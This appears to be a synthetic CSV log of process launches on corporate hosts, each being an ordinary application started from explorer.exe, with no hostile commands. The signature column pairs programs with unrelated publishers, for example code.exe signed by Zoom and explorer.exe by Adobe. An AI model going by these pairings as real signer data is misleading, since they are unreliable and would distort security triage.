timestamp,host,user,parent_process,process_name,command_line,hash,signature
2026-07-30 07:00:00,SALES-PC-002,daniel.thomas,explorer.exe,code.exe,code.exe,ea83bf00,Zoom Video Communications
2026-07-30 07:02:00,DC-SERVER-01,ava.jackson,explorer.exe,slack.exe,slack.exe,a2814044,Slack Technologies
2026-07-30 07:04:00,HR-PC-008,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,6889803e,Zoom Video Communications
2026-07-30 07:06:00,ENG-PC-019,sarah.williams,explorer.exe,teams.exe,teams.exe,546e035a,Slack Technologies
2026-07-30 07:08:00,SALES-PC-002,david.wilson,explorer.exe,slack.exe,slack.exe,d045dd1c,Adobe Inc.
2026-07-30 07:10:00,FIN-PC-023,sophia.anderson,explorer.exe,outlook.exe,outlook.exe,50843242,Zoom Video Communications
2026-07-30 07:12:00,ENG-PC-019,sarah.williams,explorer.exe,slack.exe,slack.exe,dd6ac7b8,Adobe Inc.
2026-07-30 07:14:00,FIN-PC-023,daniel.thomas,explorer.exe,code.exe,code.exe,69ca97d2,Microsoft
2026-07-30 07:16:00,FIN-PC-011,daniel.thomas,explorer.exe,onedrive.exe,onedrive.exe,9f64eeed,Slack Technologies
2026-07-30 07:18:00,SALES-PC-002,john.smith,explorer.exe,excel.exe,excel.exe,445dcc38,Adobe Inc.
2026-07-30 07:20:00,DC-SERVER-01,david.wilson,explorer.exe,code.exe,code.exe,e17f29e1,Slack Technologies
2026-07-30 07:22:00,HR-PC-008,john.smith,explorer.exe,acrobat.exe,acrobat.exe,cc9fd334,Google LLC
2026-07-30 07:24:00,DC-SERVER-01,david.wilson,explorer.exe,notepad.exe,notepad.exe,03802b70,Adobe Inc.
2026-07-30 07:26:00,VPN-GW-01,sarah.williams,explorer.exe,excel.exe,excel.exe,fe049059,Microsoft
2026-07-30 07:28:00,SALES-PC-002,sarah.williams,explorer.exe,teams.exe,teams.exe,7f95897c,Zoom Video Communications
2026-07-30 07:30:00,LEGAL-PC-006,david.wilson,explorer.exe,slack.exe,slack.exe,d5b077e0,Slack Technologies
2026-07-30 07:32:00,SALES-PC-002,emily.davis,explorer.exe,code.exe,code.exe,8d1fb540,Google LLC
2026-07-30 07:34:00,VPN-GW-01,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,821c1336,Google LLC
2026-07-30 07:36:00,HR-PC-008,david.wilson,explorer.exe,slack.exe,slack.exe,57021049,Adobe Inc.
2026-07-30 07:38:00,IT-PC-004,john.smith,explorer.exe,explorer.exe,explorer.exe,b9de7a3a,Zoom Video Communications
2026-07-30 07:40:00,FILE-SERVER-02,ava.jackson,explorer.exe,code.exe,code.exe,dd81b7f5,Google LLC
2026-07-30 07:42:00,SALES-PC-002,daniel.thomas,explorer.exe,code.exe,code.exe,585a0afa,Zoom Video Communications
2026-07-30 07:44:00,LEGAL-PC-006,daniel.thomas,explorer.exe,slack.exe,slack.exe,749176f4,Zoom Video Communications
2026-07-30 07:46:00,FIN-PC-011,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,620a60ac,Google LLC
2026-07-30 07:48:00,VPN-GW-01,john.smith,explorer.exe,onedrive.exe,onedrive.exe,bea4ff31,Slack Technologies
2026-07-30 07:50:00,VPN-GW-01,james.taylor,explorer.exe,teams.exe,teams.exe,7ecddbaf,Microsoft
2026-07-30 07:52:00,DC-SERVER-01,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,54fd9ad3,Microsoft
2026-07-30 07:54:00,SALES-PC-002,sarah.williams,explorer.exe,notepad.exe,notepad.exe,e912b4bf,Slack Technologies
2026-07-30 07:56:00,FIN-PC-023,michael.brown,explorer.exe,slack.exe,slack.exe,def57689,Google LLC
2026-07-30 07:58:00,HR-PC-008,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,56abf2f1,Adobe Inc.
2026-07-30 08:00:00,VPN-GW-01,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,da330aa1,Adobe Inc.
2026-07-30 08:02:00,VPN-GW-01,olivia.moore,explorer.exe,code.exe,code.exe,df547e50,Adobe Inc.
2026-07-30 08:04:00,FIN-PC-023,ava.jackson,explorer.exe,outlook.exe,outlook.exe,3c19e71d,Zoom Video Communications
2026-07-30 08:06:00,FIN-PC-011,sarah.williams,explorer.exe,slack.exe,slack.exe,fa745761,Microsoft
2026-07-30 08:08:00,HR-PC-008,sophia.anderson,explorer.exe,teams.exe,teams.exe,b1aa0f6a,Zoom Video Communications
2026-07-30 08:10:00,FIN-PC-023,john.smith,explorer.exe,onedrive.exe,onedrive.exe,cbd00ef2,Microsoft
2026-07-30 08:12:00,IT-PC-004,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,6e417d47,Google LLC
2026-07-30 08:14:00,FIN-PC-011,daniel.thomas,explorer.exe,slack.exe,slack.exe,90e0a95b,Google LLC
2026-07-30 08:16:00,DC-SERVER-01,michael.brown,explorer.exe,outlook.exe,outlook.exe,9c07a751,Slack Technologies
2026-07-30 08:18:00,FILE-SERVER-02,emily.davis,explorer.exe,code.exe,code.exe,e9af299d,Adobe Inc.
2026-07-30 08:20:00,DC-SERVER-01,emily.davis,explorer.exe,code.exe,code.exe,a34db7c5,Zoom Video Communications
2026-07-30 08:22:00,SALES-PC-002,david.wilson,explorer.exe,chrome.exe,chrome.exe,e61ede90,Slack Technologies
2026-07-30 08:24:00,IT-PC-004,daniel.thomas,explorer.exe,teams.exe,teams.exe,12e89d10,Slack Technologies
2026-07-30 08:26:00,ENG-PC-019,ava.jackson,explorer.exe,explorer.exe,explorer.exe,a3917c99,Slack Technologies
2026-07-30 08:28:00,IT-PC-004,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,32ffe294,Slack Technologies
